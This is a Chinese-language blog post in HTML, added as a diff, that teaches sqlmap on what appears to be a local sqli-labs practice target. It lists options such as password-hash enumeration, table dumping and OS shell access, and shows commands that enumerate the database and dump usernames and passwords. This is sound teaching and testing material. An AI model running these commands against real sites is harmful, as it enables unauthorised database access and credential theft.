@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SQL注入_sqlmap使用 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sqlmap功能kali中自带sqlmap功能，在vscode中使用要到gitup中下载相应压缩包。 选项:1234-h, --help            显示基本帮助信息并退出 -hh                   显示高级帮助信息并退出 --version             显示程序的版本号并退出 -v VERBOSE            冗长级别: 0-6 (默认 1)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入_sqlmap使用">
+<meta property="og:url" content="http://example.com/2023/12/22/SQL%E6%B3%A8%E5%85%A5-sqlmap%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sqlmap功能kali中自带sqlmap功能，在vscode中使用要到gitup中下载相应压缩包。 选项:1234-h, --help            显示基本帮助信息并退出 -hh                   显示高级帮助信息并退出 --version             显示程序的版本号并退出 -v VERBOSE            冗长级别: 0-6 (默认 1)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222170007200.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222170832700.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222171201722.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222171411835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222171734913.png">
+<meta property="article:published_time" content="2023-12-22T08:02:57.000Z">
+<meta property="article:modified_time" content="2023-12-22T09:19:18.753Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222170007200.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>34</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-SQL注入-sqlmap使用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/22/SQL%E6%B3%A8%E5%85%A5-sqlmap%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time class="post-time" datetime="2023-12-22T08:02:57.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL注入_sqlmap使用
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="sqlmap功能"><a href="#sqlmap功能" class="headerlink" title="sqlmap功能"></a>sqlmap功能</h3><p>kali中自带sqlmap功能，在vscode中使用要到gitup中下载相应压缩包。</p>
+<h4 id="选项"><a href="#选项" class="headerlink" title="选项:"></a>选项:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-h, --help            显示基本帮助信息并退出 </span><br><span class="line">-hh                   显示高级帮助信息并退出 </span><br><span class="line">--version             显示程序的版本号并退出 </span><br><span class="line">-v VERBOSE            冗长级别: 0-6 (默认 1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="目标-必须提供这些选项中的至少一个来定义目标"><a href="#目标-必须提供这些选项中的至少一个来定义目标" class="headerlink" title="目标: 必须提供这些选项中的至少一个来定义目标"></a>目标: 必须提供这些选项中的至少一个来定义目标</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL   目标URL (例如 &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">-g GOOGLEDORK       处理Google Dork结果作为目标URL</span><br></pre></td></tr></table></figure>
+
+<h4 id="请求-这些选项可用于指定如何连接到目标URL"><a href="#请求-这些选项可用于指定如何连接到目标URL" class="headerlink" title="请求: 这些选项可用于指定如何连接到目标URL"></a>请求: 这些选项可用于指定如何连接到目标URL</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA         通过POST发送的数据字符串 (例如 &quot;id=1&quot;)</span><br><span class="line">--cookie=COOKIE     HTTP Cookie头的值 (例如 &quot;PHPSESSID=a8d127e..&quot;)</span><br><span class="line">--random-agent      使用随机选择的HTTP User-Agent头的值</span><br><span class="line">--proxy=PROXY       使用代理连接到目标URL</span><br><span class="line">--tor               使用Tor匿名网络</span><br><span class="line">--check-tor         检查Tor是否被正确使用</span><br></pre></td></tr></table></figure>
+
+<h4 id="注入-这些选项可用于指定要测试的参数，提供自定义注入载荷和可选的篡改脚本"><a href="#注入-这些选项可用于指定要测试的参数，提供自定义注入载荷和可选的篡改脚本" class="headerlink" title="注入: 这些选项可用于指定要测试的参数，提供自定义注入载荷和可选的篡改脚本"></a>注入: 这些选项可用于指定要测试的参数，提供自定义注入载荷和可选的篡改脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER    可测试的参数</span><br><span class="line">--dbms=DBMS         强制后端DBMS为指定值</span><br></pre></td></tr></table></figure>
+
+<h4 id="检测-这些选项可用于自定义检测阶段"><a href="#检测-这些选项可用于自定义检测阶段" class="headerlink" title="检测: 这些选项可用于自定义检测阶段"></a>检测: 这些选项可用于自定义检测阶段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL       执行的测试级别 (1-5, 默认 1)</span><br><span class="line">--risk=RISK         执行的测试风险 (1-3, 默认 1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="技术-这些选项可用于调整特定SQL注入技术的测试"><a href="#技术-这些选项可用于调整特定SQL注入技术的测试" class="headerlink" title="技术: 这些选项可用于调整特定SQL注入技术的测试"></a>技术: 这些选项可用于调整特定SQL注入技术的测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH..  要使用的SQL注入技术 (默认 &quot;BEUSTQ&quot;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="枚举-这些选项可用于枚举后端数据库管理系统信息、结构和表中包含的数据"><a href="#枚举-这些选项可用于枚举后端数据库管理系统信息、结构和表中包含的数据" class="headerlink" title="枚举: 这些选项可用于枚举后端数据库管理系统信息、结构和表中包含的数据"></a>枚举: 这些选项可用于枚举后端数据库管理系统信息、结构和表中包含的数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-a, --all           检索所有内容</span><br><span class="line">-b, --banner        检索DBMS横幅</span><br><span class="line">--current-user      检索DBMS当前用户</span><br><span class="line">--current-db        检索DBMS当前数据库</span><br><span class="line">--passwords         枚举DBMS用户密码哈希</span><br><span class="line">--dbs               枚举DBMS数据库</span><br><span class="line">--tables            枚举DBMS数据库表</span><br><span class="line">--columns           枚举DBMS数据库表列</span><br><span class="line">--schema            枚举DBMS模式</span><br><span class="line">--dump              转储DBMS数据库表条目</span><br><span class="line">--dump-all          转储所有DBMS数据库表条目</span><br><span class="line">-D DB               要枚举的DBMS数据库</span><br><span class="line">-T TBL              要枚举的DBMS数据库表</span><br><span class="line">-C COL              要枚举的DBMS数据库表列</span><br></pre></td></tr></table></figure>
+
+<h4 id="操作系统访问-这些选项可用于访问后端数据库管理系统底层操作系统"><a href="#操作系统访问-这些选项可用于访问后端数据库管理系统底层操作系统" class="headerlink" title="操作系统访问: 这些选项可用于访问后端数据库管理系统底层操作系统"></a>操作系统访问: 这些选项可用于访问后端数据库管理系统底层操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--os-shell          提示输入交互式操作系统shell</span><br><span class="line">--os-pwn            提示输入OOB shell、Meterpreter或VNC</span><br></pre></td></tr></table></figure>
+
+<h4 id="一般-这些选项可用于设置一些常规工作参数"><a href="#一般-这些选项可用于设置一些常规工作参数" class="headerlink" title="一般: 这些选项可用于设置一些常规工作参数"></a>一般: 这些选项可用于设置一些常规工作参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--batch             从不要求用户输入，使用默认行为</span><br><span class="line">--flush-session     清除当前目标的会话文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="杂项-这些选项不属于任何其他类别"><a href="#杂项-这些选项不属于任何其他类别" class="headerlink" title="杂项: 这些选项不属于任何其他类别"></a>杂项: 这些选项不属于任何其他类别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--wizard            面向初学者用户的简单向导界面</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -h#查看sqlmap的功能</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222170007200.png" alt="image-20231222170007200"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.8/sqli/Less-1/?id=1&quot; --dbs</span><br><span class="line">#查看网站http://192.168.2.8/sqli/Less-1/?id=1的数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222170832700.png" alt="image-20231222170832700"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.8/sqli/Less-1/?id=1&quot; --batch -D security --tables</span><br><span class="line">#查security库的所有表</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222171201722.png" alt="image-20231222171201722"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.8/sqli/Less-1/?id=1&quot; --batch -D security -T users --columns</span><br><span class="line">#查security库的users表的所有列和列的type</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222171411835.png" alt="image-20231222171411835"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.8/sqli/Less-1/?id=1&quot; --batch -D security -T users -C &quot;id,password,username&quot; --dump</span><br><span class="line">#查security库的users表中id,password,username的所有信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231222171734913.png" alt="image-20231222171734913"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/22/SQL%E6%B3%A8%E5%85%A5-sqlmap%E4%BD%BF%E7%94%A8/" data-id="clqhz8pnk00017ku42uau9y43" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/12/20/%E7%88%AC%E8%99%AB-%E9%80%86%E5%90%91%E7%88%AC%E8%99%AB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">爬虫_逆向爬虫</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Hexo</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>34</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2022 - 2023 John Doe<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  
+<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+
+  
+<script src="/plugin/galmenu/GalMenu.js"></script>
+
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
+          
+            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
